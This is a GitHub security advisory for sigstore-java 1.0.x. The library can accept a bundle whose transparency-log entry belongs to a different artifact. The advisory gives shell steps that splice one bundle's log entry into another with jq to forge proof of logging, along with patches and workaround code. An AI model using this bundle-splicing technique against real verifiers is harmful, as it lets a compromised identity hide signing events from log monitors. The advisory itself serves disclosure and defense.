# [M] sigstore-java has vulnerability with bundle verification

## Summary
Severity: Medium
Advisory: GHSA-q4xm-6fjc-5f6w
CVE: CVE-2024-53267
CWE: CWE-345, CWE-347
Ecosystem: Maven
CVSS: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N (CVSS_V3)
Published: 2024-11-26
Source: https://github.com/advisories/GHSA-q4xm-6fjc-5f6w
Type: github-advisory

## Affected
- Maven: `dev.sigstore:sigstore-java` — affected >=1.0.0 <1.1.0

## Details
### Summary
sigstore-java has insufficient verification for a situation where a validly-signed but "mismatched" bundle is presented as proof of inclusion into a transparency log

### Impact

This bug impacts clients using any variation of KeylessVerifier.verify()

The verifier may accept a bundle with an unrelated log entry, cryptographically verifying everything but fails to ensure the log entry applies to the artifact in question, thereby "verifying" a bundle without any proof the signing event was logged.

This allows the creation of a bundle without fulcio certificate and private key combined with an unrelated but time-correct log entry to fake logging of a signing event. A malicious actor using a compromised identity may want to do this to prevent discovery via rekor's log monitors.

The signer's identity will still be available to the verifier. The signature on the bundle must still be on the correct artifact for the verifier to pass.

sigstore-gradle-plugin and sigstore-maven-plugin are not affected by this as they only provide signing functionality.

### Steps To Reproduce

Build the java sigstore-cli at v1.0.0
```shell
git clone --branch v1.0.0 git@github.com:sigstore/sigstore-java
cd sigstore-java
./gradlew :sigstore-cli:build
tar -xf sigstore-cli/build/distributions/sigstore-cli-1.0.0-SNAPSHOT.tar --strip-components 1
```

Create two random blobs
```shell
dd bs=1 count=50 </dev/urandom > blob1
dd bs=1 count=50 </dev/urandom > blob2
```

Sign each blob using the cli
```shell
./bin/sigstore-cli sign --bundle=blob1.sigstore.json blob1
./bin/sigstore-cli sign --bundle=blob2.sigstore.json blob2
```

Create a falsified bundle including the base64Signature and cert fields from blob1's bundle and the rekorBundle from blob2's bundle
```shell
jq --slurpfile bundle2 blob2.sigstore.json '.verificationMaterial.tlogEntries = $bundle2[0].verificationMaterial.tlogEntries' blob1.sigstore.json > invalidBundle.sigstore.json
```

Find the embedded artifact hash in the bundle, and compare to the sha256 sums of blob1 and blob2. See that the bundle tlog entry matches blob2.
```shell
cat invalidBundle.sigstore.json | jq -r '.verificationMaterial.tlogEntries[0].canonicalizedBody' | base64 -d | jq -r '.spec.data.hash.value'

sha256sum blob1 blob2
```

Verify the bundle against blob1
```shell
./bin/sigstore-cli verify --bundle=invalidBundle.sigstore.json blob1
# no errors???!
```

### Patches
Patched in v1.1.0 release with https://github.com/sigstore/sigstore-java/pull/856
Added conformance test for all clients in: https://github.com/sigstore/sigstore-conformance/pull/166

### Workarounds
1. Verifiers can recreate the log entry and compare it to the provided log entry.
```
var bundle = Bundle.from(bundleFile, StandardCharsets.UTF_8);
var rekorEntry = bundle.getEntries().get(0);
var calculatedHashedRekord =
    Base64.toBase64String(
        HashedRekordRequest.newHashedRekordRequest(
                artifactDigest,
                Certificates.toPemBytes(Certificates.getLeaf(bundle.getCertPath())),
                bundle.getMessageSignature().get().getSignature())
            .toJsonPayload()
            .getBytes(StandardCharsets.UTF_8));
if (!Objects.equals(calculatedHashedRekord, rekorEntry.getBody())) {
  throw new Exception("Provided verification materials are inconsistent with log entry");
}
```
2. Verifiers can contact the log and discover if the artifact signing event has indeed been added to the log
```java
var bundle = Bundle.from(bundleFile, StandardCharsets.UTF);
var artifactDigest = Files.asByteSource(Path.of(artifact).toFile()).hash(Hashing.sha256()).asBytes();
var sigstoreTufClientBuilder = SigstoreTufClient.builder().usePublicGoodInstance();
var trustedRootProvider = TrustedRootProvider.from(sigstoreTufClientBuilder);
var entry = RekorEntryFetcher.fromTrustedRoot(trustedRootProvider).getEntryFromRekor(artifactDigest, Certificates.getLeaf(bundle.getCertPath()), bundle.getMessageSignature().get().getSignature());
RekorVerifier.newRekorVerifier(trustedRootProvider.get()).verifyEntry(entry);
```

## References
- https://github.com/sigstore/sigstore-java/security/advisories/GHSA-q4xm-6fjc-5f6w
- https://nvd.nist.gov/vuln/detail/CVE-2024-53267
- https://github.com/sigstore/sigstore-conformance/pull/166
- https://github.com/sigstore/sigstore-java/pull/856
- https://github.com/sigstore/sigstore-java
